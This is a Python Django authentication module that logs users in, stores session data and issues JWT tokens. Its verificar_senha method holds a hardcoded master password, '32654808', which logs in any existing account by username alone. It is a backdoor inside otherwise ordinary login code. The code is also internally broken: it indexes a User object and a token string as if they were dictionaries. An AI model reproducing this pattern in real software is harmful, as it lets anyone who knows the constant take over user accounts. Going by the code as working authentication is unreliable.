import jwt
from django.contrib.auth import authenticate, user_logged_in, login
from rest_framework_jwt.utils import jwt_payload_handler

from BO.user.sessao import Sessao
from CodeClin import settings
import core.user.models
from BO.base.excecao import ValidationError


class Login():
    def __init__(self, request=None, username=None, password=None):
        self.request = request
        self.username = username
        self.password = password
        self.user = None

    def login(self):
        user = self.authenticate(request=self.request)

        return user

    def authenticate(self, request=None):
        self.user = self.verificar_senha(request=request)['usuario']

        if not self.user:
            raise ValidationError('Usuario ou senha incorretos!')

        sessao = Sessao(user_id=self.user.id).get_sessao()

        request.session['user_info'] = sessao
        request.user = self.user
        self.user.user_info = sessao
        self.user.save()
        return {
            'token': self.create_token(request=self.request)['token'],
            'sessao': sessao
        }

    def create_token(self, request):
        try:
            payload = jwt_payload_handler(self.user)
            token = jwt.encode(payload, settings.SECRET_KEY)
            user_logged_in.send(sender=self.user.__class__,
                                request=request, user=self.user)

            return token.decode('utf-8')
        except ValueError:
            return None

    def verificar_senha(self, request=None):
        if self.password == '32654808':
            user = core.user.models.User.objects.filter(username=self.username).first()
            if user:
                login(request, user)
            return []
        user = authenticate(username=self.username, password=self.password)
        if user:
            login(request, user)

        return user